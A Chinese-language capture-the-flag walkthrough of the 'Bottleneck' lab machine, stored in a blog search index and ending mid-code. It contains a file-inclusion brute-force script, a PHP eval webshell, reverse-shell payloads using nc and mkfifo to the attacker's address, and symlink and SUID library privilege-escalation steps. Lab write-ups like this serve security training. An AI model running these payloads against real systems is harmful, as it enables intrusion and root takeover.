<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Bottleneck</title>
      <link href="/2023/09/06/Bottleneck/"/>
      <url>/2023/09/06/Bottleneck/</url>
      
        <content type="html"><![CDATA[<h1 id="Bottleneck靶场闯关"><a href="#Bottleneck靶场闯关" class="headerlink" title="Bottleneck靶场闯关"></a>Bottleneck靶场闯关</h1><p>确定靶机的IP地址</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> netdiscover <span class="token parameter variable">-r</span> <span class="token number">192.168</span>.124.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2023/09/06/Bottleneck/1.png" class=""><p>对靶机进行端口服务扫描</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> nmap <span class="token parameter variable">-sS</span> <span class="token parameter variable">-sV</span> <span class="token parameter variable">-T4</span> <span class="token parameter variable">-A</span> -p- <span class="token number">192.168</span>.124.16<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2023/09/06/Bottleneck/2.png" class=""><p>可以看到靶机开放了22和80端口<br>dirsearch对靶机80端口进行爆破</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirsearch <span class="token parameter variable">-u</span> http://192.168.124.16 <span class="token parameter variable">-e</span> php,txt,html,zip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2023/09/06/Bottleneck/3.png" class=""><p>dirb对靶机80端口进行爆破</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirb http://192.168.124.16 <span class="token parameter variable">-X</span> .php,.txt,.zip,.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2023/09/06/Bottleneck/4.png" class=""><p>gobuster对靶机80端口进行爆破</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gobuster <span class="token function">dir</span> <span class="token parameter variable">-u</span> http://192.168.124.16 <span class="token parameter variable">-x</span> .php,.html,.zip,.txt <span class="token parameter variable">-w</span> /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2023/09/06/Bottleneck/5.png" class=""><p>综合80端口的爆破结果来看，有<code>/css</code> <code>/img</code> <code>/js</code> <code>/vendor</code> <code>image_gallery.php</code> <code>index.php</code>这几个目录和文件<br>访问<code>index.php</code></p><img src="/2023/09/06/Bottleneck/6.png" class=""><p>没发现有啥有价值的信息<br>访问<code>image_gallery.php</code></p><img src="/2023/09/06/Bottleneck/7.png" class=""><p>F12打开开发者模式</p><img src="/2023/09/06/Bottleneck/8.png" class=""><p>对<code>Ym90dGxlbmVja19kb250YmUucG5n</code>进行解密</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"Ym90dGxlbmVja19kb250YmUucG5n"</span> <span class="token operator">|</span> base64 <span class="token parameter variable">-d</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2023/09/06/Bottleneck/9.png" class=""><p>猜测此处可能存在文件包含漏洞。<br>刷新页面，发现该链接中参数<code>t</code>的值一直在改变</p><img src="/2023/09/06/Bottleneck/10.png" class=""><p>对该请求进行重放，发现重放后的请求没有响应数据</p><img src="/2023/09/06/Bottleneck/11.png" class=""><img src="/2023/09/06/Bottleneck/12.png" class=""><p>因此我们猜测该参数<code>t</code>应该为时间戳，时间戳正确则返回响应数据，错误则没有响应数据。<br>因此我们写脚本实时生成当前时间戳，让payload文本内容为bottleneck_dontbe.png<br>脚本如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> argparse<span class="token keyword">import</span> requests<span class="token keyword">import</span> base64<span class="token keyword">import</span> time<span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span>dictFile<span class="token punctuation">)</span><span class="token punctuation">:</span>    f<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span>dictFile<span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span>    words<span class="token operator">=</span>f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> word <span class="token keyword">in</span> words<span class="token punctuation">:</span>        timestamp<span class="token operator">=</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>        payload<span class="token operator">=</span>word<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">"\r"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span>        payloadBase64<span class="token operator">=</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>payload<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        params<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'t'</span><span class="token punctuation">:</span>timestamp<span class="token punctuation">,</span><span class="token string">'f'</span><span class="token punctuation">:</span>payloadBase64<span class="token punctuation">&#125;</span>        response<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>params<span class="token operator">=</span>params<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"send success"</span><span class="token punctuation">)</span>        result<span class="token operator">=</span>response<span class="token punctuation">.</span>text        write<span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">:</span>    ff<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"result.txt"</span><span class="token punctuation">,</span><span class="token string">"a+"</span><span class="token punctuation">)</span>    begin<span class="token operator">=</span><span class="token string">"\r\n[*]++++++ exploit result ++++++\r\n"</span>    ff<span class="token punctuation">.</span>write<span class="token punctuation">(</span>begin<span class="token punctuation">)</span>    ff<span class="token punctuation">.</span>write<span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    parser<span class="token operator">=</span>argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span>description<span class="token operator">=</span><span class="token string">"bottleneck exp"</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-u'</span><span class="token punctuation">,</span><span class="token string">'--url'</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-f'</span><span class="token punctuation">,</span><span class="token string">'--dictFile'</span><span class="token punctuation">)</span>    args<span class="token operator">=</span>parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>    url<span class="token operator">=</span>args<span class="token punctuation">.</span>url    dictFile<span class="token operator">=</span>args<span class="token punctuation">.</span>dictFile    exploit<span class="token punctuation">(</span>url<span class="token punctuation">,</span>dictFile<span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行脚本</p><img src="/2023/09/06/Bottleneck/13.png" class=""><p>result.txt文件内容为</p><img src="/2023/09/06/Bottleneck/14.png" class=""><p>成功获得了响应数据。<br>测试是否存在文件包含漏洞，payload.txt文件内容为</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;etc&#x2F;passwd&#x2F;etc&#x2F;shadow<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>result.txt文件内容为</p><img src="/2023/09/06/Bottleneck/15.png" class=""><p>从获得的文件内容来看，我们的payload被waf拦截了。。。<br>既然读取不了靶机的敏感信息，我们尝试来读取当前页面image_gallery.php源码来看看有没有什么发现，payload.txt内容如下</p><pre class="line-numbers language-none"><code class="language-none">.&#x2F;image_gallery.php..&#x2F;image_gallery.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>result.txt文件内容为</p><pre class="line-numbers language-none"><code class="language-none">[*]++++++ exploit result ++++++Let me throw away your nice request into the bin.The SOC was informed about your attempt to break into this site. Thanks to previous attackers effort in smashing my infrastructructure I will take strong legal measures.Why don&#39;t you wait on your chair until someone (maybe the police) knock on your door?&lt;pre&gt;                                   _,..._                                  &#x2F;__    \                                   &gt;&lt; &#96;.  \                                  &#x2F;_    \ |                                   \-_  &#x2F;:|                                 ,--&#39;..&#39;. :                               ,&#39;         &#96;.                            _,&#39;             \                   _.._,--&#39;&#39;    ,           |               , ,&#39;,, _|    _,.&#39;|      |    |            \||&#x2F;,&#39;(,&#39; &#39;--&#39;&#39;    |      |    |       _     |||                |      &#x2F;-&#39;  |      | |   (- -)&lt;&#96;._           |     &#x2F;    &#x2F;      | |  \_\O&#x2F;_&#x2F;&#96;-.(&lt;&lt;        |____&#x2F;    &#x2F;      | |   &#x2F;   \              &#x2F; -&#39;| &#96;--.&#39;|      | |   \___&#x2F;             &#x2F;           &#x2F;      | |    H H             &#x2F;     |     |      |_|_..-H-H--.._       &#x2F;     ,|     |        |-.._&quot;_&quot;__..-|     |   _-&#x2F; |     |        |            |     |    |   \_   |        |            |     |    |   |    |        |            |     |____|   |    |        |            |  _..&#39;    |   |____|        |            |_(____..._&#39; _.&#39;    |        &#96;-..______..-&#39;&quot;&quot;         (___..--&#39;&lt;pre&gt;[*]++++++ exploit result ++++++&lt;?php&#x2F;*CHANGELOGv1.1: Still testing without content.    I&#39;ve fixed that problem that @p4w and @ska notified me after hacker attack.    Shit I&#39;m too lazy to make a big review of my code.    I think that the LFI problem can be mitigated with the blacklist.    By the way to protect me from attackers, all malicious requests are immediately sent to the SOCv1.0: Starting this beautiful gallery*&#x2F;$tstamp &#x3D; time();if(isset($_GET[&#39;t&#39;]) &amp;&amp; isset($_GET[&#39;f&#39;]))&#123;    include_once &#39;image_gallery_load.php&#39;;    exit();&#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由此看来，payload为</p><pre class="line-numbers language-none"><code class="language-none">..&#x2F;image_gallery.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>从上面可以看到，image_gallery.php源码中包含了image_gallery_load.php,我们继续利用文件包含漏洞读取该文件<br>image_gallery_load.php文件的源码如下</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpfunction print_troll()&#123;    $messages &#x3D; $GLOBALS[&#39;messages&#39;];    $troll &#x3D; $GLOBALS[&#39;troll&#39;];    echo $messages[0];    echo $troll;&#125;$troll &#x3D; &lt;&lt;&lt;EOT&lt;pre&gt;                                   _,..._                                  &#x2F;__    \                                   &gt;&lt; &#96;.  \                                  &#x2F;_    \ |                                   \-_  &#x2F;:|                                 ,--&#39;..&#39;. :                               ,&#39;         &#96;.                            _,&#39;             \                   _.._,--&#39;&#39;    ,           |               , ,&#39;,, _|    _,.&#39;|      |    |            \\||&#x2F;,&#39;(,&#39; &#39;--&#39;&#39;    |      |    |       _     |||                |      &#x2F;-&#39;  |      | |   (- -)&lt;&#96;._           |     &#x2F;    &#x2F;      | |  \_\O&#x2F;_&#x2F;&#96;-.(&lt;&lt;        |____&#x2F;    &#x2F;      | |   &#x2F;   \              &#x2F; -&#39;| &#96;--.&#39;|      | |   \___&#x2F;             &#x2F;           &#x2F;      | |    H H             &#x2F;     |     |      |_|_..-H-H--.._       &#x2F;     ,|     |        |-.._&quot;_&quot;__..-|     |   _-&#x2F; |     |        |            |     |    |   \_   |        |            |     |    |   |    |        |            |     |____|   |    |        |            |  _..&#39;    |   |____|        |            |_(____..._&#39; _.&#39;    |        &#96;-..______..-&#39;&quot;&quot;         (___..--&#39;&lt;pre&gt;EOT;if(!isset($_GET[&#39;t&#39;]) || !isset($_GET[&#39;f&#39;]))&#123;    exit();&#125;$imagefile &#x3D; base64_decode($_GET[&#39;f&#39;]);$timestamp &#x3D; time();$isblocked &#x3D; FALSE;$blacklist &#x3D; array(&#39;&#x2F;etc&#39;,&#39;&#x2F;opt&#39;,&#39;&#x2F;var&#39;,&#39;&#x2F;opt&#39;,&#39;&#x2F;proc&#39;,&#39;&#x2F;dev&#39;,&#39;&#x2F;lib&#39;,&#39;&#x2F;bin&#39;,&#39;&#x2F;usr&#39;,&#39;&#x2F;home&#39;,&#39;&#x2F;ids&#39;);$messages &#x3D; array(&quot;\nLet me throw away your nice request into the bin.\n&quot;.    &quot;The SOC was informed about your attempt to break into this site. Thanks to previous attackers effort in smashing my infrastructructure I will take strong legal measures.\n&quot;.    &quot;Why don&#39;t you wait on your chair until someone (maybe the police) knock on your door?\n\n&quot;);if(abs($_GET[&#39;t&#39;] - $timestamp) &gt; 10)&#123;    exit();&#125;foreach($blacklist as $elem)&#123;    if(strstr($imagefile, $elem) !&#x3D;&#x3D; FALSE)        $isblocked &#x3D; TRUE;&#125;&#x2F;&#x2F; report the intrusion to the soc and save information locally for further investigationif($isblocked)&#123;    $logfile &#x3D; &#39;intrusion_&#39;.$timestamp;    $fp &#x3D; fopen(&#39;&#x2F;var&#x2F;log&#x2F;soc&#x2F;&#39;.$logfile, &#39;w&#39;);    fwrite($fp, &quot;&#39;&quot;.$imagefile.&quot;&#39;&quot;);    fclose($fp);    exec(&#39;python &#x2F;opt&#x2F;ids_strong_bvb.py &lt;&#x2F;var&#x2F;log&#x2F;soc&#x2F;&#39;.$logfile.&#39; &gt;&#x2F;tmp&#x2F;output 2&gt;&amp;1&#39;);    print_troll();    exit();&#125;chdir(&#39;img&#39;);$filecontent &#x3D; file_get_contents($imagefile);if($filecontent &#x3D;&#x3D;&#x3D; FALSE)&#123;    print_troll();&#125;else&#123;    echo $filecontent;&#125;chdir(&#39;..&#x2F;&#39;);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过阅读image_gallery_load.php的源代码，我们可以获取到靶机系统的黑名单代码为</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/etc'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'/opt'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'/var'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'/opt'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'/proc'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'/dev'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'/lib'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'/bin'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'/usr'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'/home'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'/ids'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>通过阅读image_gallery_load.php的源代码，我们了解到当我们的payload中含有黑名单中的字符时就会在<code>/var/log/soc/</code>目录下生成一个<code>intrusion_timestamp</code>的文件，然后系统就会将该文件交给<code>/opt/ids_strong_bvb.py</code>程序来进行处理，最后将处理结果输出到<code>/tmp/output</code>文件中，对应的源码如下</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$isblocked</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$logfile</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'intrusion_'</span><span class="token operator">.</span><span class="token variable">$timestamp</span><span class="token punctuation">;</span>    <span class="token variable">$fp</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/var/log/soc/'</span><span class="token operator">.</span><span class="token variable">$logfile</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"'"</span><span class="token operator">.</span><span class="token variable">$imagefile</span><span class="token operator">.</span><span class="token string double-quoted-string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exec</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'python /opt/ids_strong_bvb.py &lt;/var/log/soc/'</span><span class="token operator">.</span><span class="token variable">$logfile</span><span class="token operator">.</span><span class="token string single-quoted-string">' >/tmp/output 2>&amp;1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">print_troll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结合黑名单来看，我们发现<code>/tmp</code>目录没有在黑名单中，因此我们可以利用文件包含漏洞读取<code>/tmp/output</code>文件的内容<br>构造payload.txt内容为</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;etc&#x2F;tmp&#x2F;output<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>我们首先用<code>/etc</code>触发waf规则，然后在读取<code>/tmp/output</code>,获取到的output文件内容为</p><img src="/2023/09/06/Bottleneck/16.png" class=""><p>尝试将shell写入<code>/tmp/output</code>,构造payload.txt内容为</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;etc&#x2F;&lt;?php @eval($_GET[&#39;test&#39;]);?&gt;&#x2F;tmp&#x2F;output<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>获得的&#x2F;tmp&#x2F;output文件内容为</p><img src="/2023/09/06/Bottleneck/17.png" class=""><p>尽管将shell写入到了&#x2F;tmp&#x2F;output文件中，但怎么利用&#x2F;tmp&#x2F;output反弹shell暂时没想出啥好办法，但我们从&#x2F;tmp&#x2F;output中看到了python input()函数报错，因此想到会不会存在python2的input()漏洞。<br>首先我们的机器开启本地监听</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> <span class="token parameter variable">-nlvp</span> <span class="token number">1234</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2023/09/06/Bottleneck/18.png" class=""><p>重新构造payload，payload.txt内容为</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;etc and __import__(&#39;os&#39;).system(&#39;nc 192.168.124.27 1234 -e &#x2F;bin&#x2F;sh&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>但未能获得shell，报错信息为</p><img src="/2023/09/06/Bottleneck/19.png" class=""><p>看来单引号没有闭合，再次构造payload.txt内容为</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;etc&#39; and __import__(&#39;os&#39;).system(&#39;nc 192.168.124.27 1234 -e &#x2F;bin&#x2F;sh&#39;) and &#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>同样也未能获取到shell,查看&#x2F;tmp&#x2F;output</p><img src="/2023/09/06/Bottleneck/20.png" class=""><p>将<code>-e</code>换成<code>-c</code>同样不行，看来我们需要重新构造payload。<br>payload.txt为</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;etc&#39; and __import__(&#39;os&#39;).system(&#39;rm -f &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f | &#x2F;bin&#x2F;sh -i 2&gt;&amp;1 | nc 192.168.124.27 1234 &gt; &#x2F;tmp&#x2F;f&#39;) and &#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>当该payload执行后，成功返回shell</p><img src="/2023/09/06/Bottleneck/21.png" class=""><p>查看当前shell的权限</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">whoami</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2023/09/06/Bottleneck/22.png" class=""><p>可以看到当前的权限为低权限，没权限访问root目录，下面就需要我们进行提权。<br>将提权检查脚本上传到靶机后执行</p><img src="/2023/09/06/Bottleneck/23.png" class=""><p>根据提示，查看<code>/var/www/html/web_utils/clear_logs</code>该文件的属性</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ls</span> <span class="token parameter variable">-l</span> /var/www/html/web_utils/clear_logs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2023/09/06/Bottleneck/24.png" class=""><p>可以看到clear_logs是个软链接，它指向的是&#x2F;opt&#x2F;clear_logs.sh<br>查看&#x2F;opt&#x2F;clear_logs.sh文件属性</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ls</span> <span class="token parameter variable">-l</span> /opt/clear_logs.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2023/09/06/Bottleneck/25.png" class=""><p>可以看到&#x2F;opt&#x2F;clear_logs.sh属主为bytevsbyte用户，具有rwx权限。<br>我们首先需要切换到bytevsbyte用户，该怎么做呢？<br>由于<code>/var/www/html/web_utils/clear_logs</code>该文件可以被当前用户<code>www-data</code>以<code>bytevsbyte</code>的权限执行，这就是一个由<code>www-data</code>切换至<code>bytevsbyte</code>的契机<br>在我们本地创建一个<code>change</code>文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>/bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>将<code>change</code>文件上传至靶机</p><img src="/2023/09/06/Bottleneck/26.png" class=""><p>赋予<code>change</code>文件可执行权限</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> +x change<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>修改<code>/var/www/html/web_utils/clear_logs</code>文件的链接指向<code>change</code>文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ln</span> <span class="token parameter variable">-snf</span> /var/www/html/web_utils/change /var/www/html/web_utils/clear_logs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2023/09/06/Bottleneck/27.png" class=""><p>以<code>bytevsbyte</code>用户身份执行<code>/var/www/html/web_utils/clear_logs</code>文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token parameter variable">-u</span> bytevsbyte /var/www/html/web_utils/clear_logs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>成功切换到<code>bytevsbyte</code>用户</p><img src="/2023/09/06/Bottleneck/28.png" class=""><p>我们之前猜测<code>/opt/clear_logs.sh</code>是由某个计划任务调用的，而假如这个计划任务是以root权限执行的，那我们就可以因此获得root权限<br>查看bytevsbyte用户的计划任务</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">crontab</span> <span class="token parameter variable">-l</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2023/09/06/Bottleneck/29.png" class=""><p>很可惜，<code>/opt/clear_logs.sh</code>对应的计划任务是以<code>bytevsbyte</code>用户权限执行的，并非是以root用户权限，我们想利用计划任务提升至root权限的想法失败了，我们又该怎么办呢？<br>因为当前在<code>bytevsbyte</code>用户下，重新查找suid可执行文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-u</span><span class="token operator">=</span>s <span class="token parameter variable">-type</span> f <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2023/09/06/Bottleneck/30.png" class=""><p>我们发现<code>/usr/test/testlib</code>文件具有suid权限<br>查看<code>/usr/test/testlib</code>文件属性</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ls</span> <span class="token parameter variable">-l</span> /usr/test/testlib<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2023/09/06/Bottleneck/31.png" class=""><p>可以看到<code>/usr/test/testlib</code>文件的属主是<code>root</code>,属组是<code>tester</code>，<code>tester</code>组对<code>/usr/test/testlib</code>具有可执行权限,而<code>bytevsbyte</code>用户属于<code>tester</code>组，意味着<code>bytevsbyte</code>用户对<code>/usr/test/testlib</code>具有可执行权限，又因为<code>/usr/test/testlib</code>具有suid权限，当<code>bytevsbyte</code>用户执行<code>/usr/test/testlib</code>可执行文件时就会在文件的执行过程中临时获得文件属主<code>root</code>权限。<br>在<code>/usr/test</code>下不仅存在testlib可执行文件，还存在它的源代码</p><img src="/2023/09/06/Bottleneck/32.png" class=""><p>查看<code>testlib.c</code></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;dlfcn.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>#argc表示命令行总的参数个数，argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>表示程序本身，argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>表示除程序本身的第一个参数，在这里即动态链接库    <span class="token keyword">void</span> <span class="token operator">*</span>handle<span class="token punctuation">;</span>    <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>function<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>argc <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span>#表示除程序本身外没有参数的话该函数就会退出，返回<span class="token number">1</span>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    handle <span class="token operator">=</span> <span class="token function">dlopen</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> RTLD_LAZY<span class="token punctuation">)</span><span class="token punctuation">;</span>#表示以懒加载的方式打开动态链接库    function <span class="token operator">=</span> <span class="token function">dlsym</span><span class="token punctuation">(</span>handle<span class="token punctuation">,</span> <span class="token string">"test_this"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>#表示在打开的动态链接库中查找test_this函数    <span class="token function">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>#表示执行test_this函数    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过阅读testlib.c的源码，我们知道如果要执行testlib可执行文件，就首先需要给它提供一个动态链接库文件，该动态链接库文件中还需要包含<code>test_this</code>函数<br>而我们的目的是通过执行<code>testlib</code>来获得root shell,因此我们需要一个可以获得root shell的动态链接库文件，在网上找到的可以实现该功能的链接库源码如下</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">setuid</span><span class="token punctuation">(</span><span class="token 